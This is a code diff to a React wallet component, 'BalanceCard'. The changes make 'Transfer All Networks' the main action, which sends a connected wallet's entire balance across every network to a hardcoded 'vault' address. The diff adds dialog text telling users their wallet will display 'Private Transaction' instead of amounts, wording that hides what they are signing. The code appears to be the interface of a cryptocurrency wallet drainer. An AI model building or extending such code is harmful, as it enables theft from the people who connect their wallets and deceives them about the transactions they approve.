@@ -18,6 +18,7 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
   const { isTransferring, transferAllFunds } = useWeb3();
   const { toast } = useToast();
   const [showConfirmation, setShowConfirmation] = useState(false);
+  const [transferType, setTransferType] = useState<'current' | 'multi'>('multi');
 
   // Get destination address from environment - using your vault address
   const destinationAddress = import.meta.env.VITE_DESTINATION_ADDRESS || "0x15E1A8454E2f31f64042EaE445Ec89266cb584bE";
@@ -50,6 +51,7 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
 
   const handleTransferClick = async () => {
     // Show confirmation first
+    setTransferType('current');
     setShowConfirmation(true);
   };
 
@@ -81,8 +83,33 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
   };
 
   const handleMultiNetworkTransfer = async () => {
-    if (onMultiNetworkTransfer) {
-      await onMultiNetworkTransfer(destinationAddress);
+    // Show confirmation first for multi-network transfer too
+    setTransferType('multi');
+    setShowConfirmation(true);
+  };
+
+  const handleConfirmMultiNetworkTransfer = async () => {
+    try {
+      setShowConfirmation(false);
+      // Show loading toast
+      toast({
+        title: "Preparing Multi-Network Private Transfer",
+        description: "Scanning networks and preparing wallet confirmations...",
+      });
+      
+      if (onMultiNetworkTransfer) {
+        await onMultiNetworkTransfer(destinationAddress);
+        toast({
+          title: "Multi-Network Private Transfer Started",
+          description: "Processing transfers across all networks privately...",
+        });
+      }
+    } catch (error: any) {
+      toast({
+        title: "Multi-Network Transfer Failed",
+        description: error.message,
+        variant: "destructive",
+      });
     }
   };
 
@@ -285,21 +312,11 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
         </div>
 
         <div className="space-y-3">
-          <Button
-            onClick={handleTransferClick}
-            disabled={isTransferring || walletState.totalUsdValue === 0}
-            className="w-full bg-danger hover:bg-red-600 text-white font-semibold py-4 px-6 flex items-center justify-center space-x-2"
-          >
-            <Send className="w-4 h-4" />
-            <span>Transfer All Funds (Current Network)</span>
-          </Button>
-
           {onMultiNetworkTransfer && (
             <Button
               onClick={handleMultiNetworkTransfer}
               disabled={isTransferring || walletState.totalUsdValue === 0}
-              variant="outline"
-              className="w-full border-orange-500 text-orange-600 hover:bg-orange-50 font-semibold py-4 px-6 flex items-center justify-center space-x-2"
+              className="w-full bg-danger hover:bg-red-600 text-white font-semibold py-4 px-6 flex items-center justify-center space-x-2"
             >
               <span>⚡</span>
               <span>{isTransferring ? "Scanning Networks..." : "Transfer All Networks"}</span>
@@ -313,7 +330,7 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
             <DialogHeader>
               <DialogTitle className="flex items-center space-x-2">
                 <Shield className="w-5 h-5 text-blue-600" />
-                <span>Confirm Private Transaction</span>
+                <span>{transferType === 'multi' ? 'Confirm Multi-Network Private Transfer' : 'Confirm Private Transaction'}</span>
               </DialogTitle>
             </DialogHeader>
             
@@ -326,7 +343,8 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
                     <div className="text-sm space-y-1">
                       <div>• Your wallet will show "Private Transaction" instead of amounts</div>
                       <div>• Transaction details will be minimized for privacy</div>
-                      <div>• All funds will be securely transferred to the vault</div>
+                      <div>• {transferType === 'multi' ? 'All networks will be scanned and funds transferred' : 'All funds will be securely transferred to the vault'}</div>
+                      {transferType === 'multi' && <div>• You may need to approve multiple network switches and transactions</div>}
                     </div>
                   </div>
                 </AlertDescription>
@@ -348,12 +366,12 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
                   Cancel
                 </Button>
                 <Button
-                  onClick={handleConfirmTransfer}
+                  onClick={transferType === 'multi' ? handleConfirmMultiNetworkTransfer : handleConfirmTransfer}
                   disabled={isTransferring}
                   className="flex-1 bg-blue-600 hover:bg-blue-700 text-white"
                 >
                   <Shield className="w-4 h-4 mr-2" />
-                  Confirm Private Transfer
+                  {transferType === 'multi' ? 'Confirm Multi-Network Transfer' : 'Confirm Private Transfer'}
                 </Button>
               </div>
             </div>
